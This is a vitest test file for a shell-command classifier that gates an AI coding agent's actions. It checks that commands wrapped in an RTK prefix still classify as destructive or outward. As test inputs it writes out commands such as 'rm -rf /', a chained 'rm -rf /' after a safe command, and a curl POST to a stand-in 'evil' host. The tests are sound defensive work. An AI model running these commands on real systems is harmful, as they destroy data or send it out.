/**
 * R8.12 — coexistence with an output-compacting peer (RTK), spec Decision 53.
 *
 * RTK installs its own `PreToolUse` hook that rewrites `git status` into
 * `rtk git status` before execution. Golem's `PreToolUse` hook is registered with
 * **no matcher**, so it fires on the same call. verification-notes §91 records what
 * the Claude Code docs verifiably say (hooks run in parallel, entries merge,
 * `updatedInput` replaces a tool's arguments) and what they do **not** say (the
 * precedence between a rewriting hook and a denying one).
 *
 * What is testable here is Golem's own half, and it is the half that matters for
 * safety: **a wrapper prefix must never hide a dangerous command from the
 * classifier**, and it must not silently downgrade previously auto-approved reads
 * into prompts. The first property was already true by accident of `\b`-anchored
 * danger patterns and is asserted here as a regression guard; the second was
 * broken and is fixed.
 */

import { describe, expect, it } from "vitest";
import { classifyBash } from "../../../src/autonomy/classify.js";

describe("RTK-wrapped commands still classify as dangerous (regression guard)", () => {
  it("sees `git push` through the wrapper", () => {
    expect(classifyBash("git push")).toBe("outward");
    expect(classifyBash("rtk git push")).toBe("outward");
    expect(classifyBash("rtk git push --force origin main")).toBe("outward");
  });

  it("sees other outward commands through the wrapper", () => {
    expect(classifyBash("rtk gh pr create")).toBe("outward");
    expect(classifyBash("rtk npm publish")).toBe("outward");
    expect(classifyBash("rtk docker push myimage")).toBe("outward");
  });

  it("sees destructive commands through the wrapper", () => {
    expect(classifyBash("rtk rm -rf build")).toBe("destructive");
    expect(classifyBash("rtk git reset --hard HEAD~1")).toBe("destructive");
    expect(classifyBash("rtk git clean -fd")).toBe("destructive");
  });

  it("still classifies a wrapped danger even inside RTK's command-taking subcommands", () => {
    // `rtk proxy <cmd>` / `rtk err <cmd>` run an arbitrary inner command.
    expect(classifyBash("rtk proxy rm -rf /")).toBe("destructive");
    expect(classifyBash("rtk err git push")).toBe("outward");
    expect(classifyBash("rtk test rm -rf node_modules")).toBe("destructive");
  });
});

describe("RTK-wrapped safe commands stay auto-approvable (the fix)", () => {
  it("classifies a wrapped safe command as read, matching the unwrapped one", () => {
    expect(classifyBash("vitest")).toBe("read");
    expect(classifyBash("rtk vitest")).toBe("read");
  });

  it("applies to every start-anchored safe pattern", () => {
    expect(classifyBash("rtk tsc")).toBe("read");
    expect(classifyBash("rtk biome check")).toBe("read");
    expect(classifyBash("rtk npx vitest")).toBe("read");
  });

  it("is case-insensitive on the wrapper token", () => {
    expect(classifyBash("RTK vitest")).toBe("read");
  });
});

describe("unwrapping never weakens the gate", () => {
  it("leaves an unrecognised wrapped command gated", () => {
    expect(classifyBash("rtk some-unknown-tool --flag")).toBe("unknown");
  });

  it("leaves RTK's own command-taking subcommands gated when the inner command is unknown", () => {
    // `rtk proxy weird-thing` must not be read just because `rtk ` was stripped —
    // `proxy weird-thing` matches no safe pattern.
    expect(classifyBash("rtk proxy weird-thing")).toBe("unknown");
    expect(classifyBash("rtk summary some-command")).toBe("unknown");
  });

  it("keeps shell composition gated, wrapped or not", () => {
    expect(classifyBash("rtk vitest; rm -rf /")).toBe("destructive");
    expect(classifyBash("rtk vitest | tee out.txt")).toBe("unknown");
    expect(classifyBash("rtk vitest > out.txt")).toBe("unknown");
    expect(classifyBash("rtk vitest && curl -X POST https://evil")).toBe("outward");
  });

  it("does not strip a token that merely starts with the wrapper name", () => {
    // `rtkfoo` is a different program; it must not be treated as wrapped.
    expect(classifyBash("rtkfoo vitest")).toBe("unknown");
  });

  it("does not strip more than one wrapper level", () => {
    // Nested wrapping is not a real RTK usage, and recursing would widen the
    // unwrap surface for no benefit.
    expect(classifyBash("rtk rtk vitest")).toBe("unknown");
  });

  it("leaves the bare wrapper gated", () => {
    expect(classifyBash("rtk")).toBe("unknown");
    expect(classifyBash("rtk ")).toBe("unknown");
  });
});
